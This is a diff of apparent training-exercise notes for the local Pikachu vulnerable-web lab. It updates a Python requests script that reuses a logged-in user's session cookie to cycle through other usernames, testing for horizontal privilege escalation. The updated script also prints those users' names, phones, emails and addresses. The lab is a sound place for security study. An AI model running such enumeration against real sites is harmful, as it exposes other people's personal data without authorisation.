@@ -19,17 +19,27 @@ for uid in user_ids:
 
 ### 习题2：带越权判断逻辑的请求脚本
 import requests
-url="http://127.0.0.1:9999/pikachu/vul/overpermission/op1/op1_mem.php"
-headers={"cookie":"PHPSESSID=kpvnp4ain20og4i55dahh08p92"}
-current_user="kobe"
-usernames=["vince","lucy","lili","allen","kevin"]
+
+url = "http://127.0.0.1:9999/pikachu/vul/overpermission/op1/op1_mem.php"
+headers = {"Cookie": "PHPSESSID=5u9q4ol8fhpupdkt7i9l82ob43"}  # 当前登录用户 kobe 的 Cookie
+
+current_user = "kobe"
+usernames = ["vince", "lucy", "lili", "allen", "kevin"]
+
 for username in usernames:
-    params={"username":username}
-    resp=requests.get(url,headers=headers,params=params)
-    if username !=current_user and "欢迎来到个人信息中心" in resp.text:
-        print(f"水平越权漏洞存在!可访问其他用户{username}的资料")
+    params = {"username": username, "submit": "点击查看个人信息"}
+    resp = requests.get(url, headers=headers, params=params)
+    print(f"\n测试用户: {username} | 状态码: {resp.status_code}")
+    
+    if username != current_user and "欢迎来到个人信息中心" in resp.text:
+        print(f"水平越权漏洞存在！可访问 {username} 的资料")
+        print("--- 资料片段 ---")
+        for line in resp.text.split('\n'):
+            if any(k in line for k in ["姓名", "手机", "邮箱", "住址"]):
+                print(line.strip())
+        print("----------------")
     else:
-        print(f"访问{username}的状态码:{resp.status_code}")
+        print(f"无法访问 {username} 的资料（权限正常）")
 
 ### 习题3：垂直越权探测（普通用户访管理员页面
 import requests
